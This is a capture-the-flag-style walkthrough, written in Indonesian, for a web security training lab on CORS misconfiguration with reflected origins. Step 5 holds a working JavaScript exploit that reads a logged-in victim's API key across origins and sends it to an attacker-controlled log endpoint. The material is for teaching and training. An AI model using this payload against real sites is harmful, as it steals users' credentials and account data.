# CORS vulnerability with basic origin reflection / Kerentanan CORS dengan refleksi asal dasar 

Situs web ini memiliki konfigurasi CORS yang tidak aman karena mempercayai semua sumber.

Untuk menyelesaikan lab ini, buatlah kode JavaScript yang menggunakan CORS untuk mengambil kunci API administrator dan unggah kode tersebut ke server exploit Anda. Lab ini berhasil diselesaikan ketika Anda berhasil mengirimkan kunci API administrator. 



---

## Cara Inject
1. Pastikan intersep dimatikan, lalu gunakan browser untuk masuk dan mengakses halaman akun Anda.
2. Tinjau riwayatnya dan perhatikan bahwa kunci Anda diambil melalui permintaan AJAX ke `/accountDetails`, dan respons tersebut berisi  `Access-Control-Allow-Credentials: true` . Header tersebut menunjukkan bahwa mungkin mendukung CORS.
3. Kirim permintaan ke Burp Repeater, dan kirim ulang dengan menambahkan header:
  - `Origin: https://example.com`
4. Perhatikan bahwa asal usulnya tercermin dalam Access-Control-Allow-OriginJudul.
5. Di browser, buka server exploit dan masukkan HTML berikut, ganti YOUR-LAB-IDdengan URL lab unik Anda:

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
6. Klik **View exploit** . Perhatikan bahwa exploit berhasil - Anda telah sampai di halaman log dan kunci API Anda ada di URL.
7. Kembali ke server exploit dan klik Kirim exploit ke korban .
8. Klik **Access Log** , ambil dan kirimkan kunci API korban untuk menyelesaikan lab.
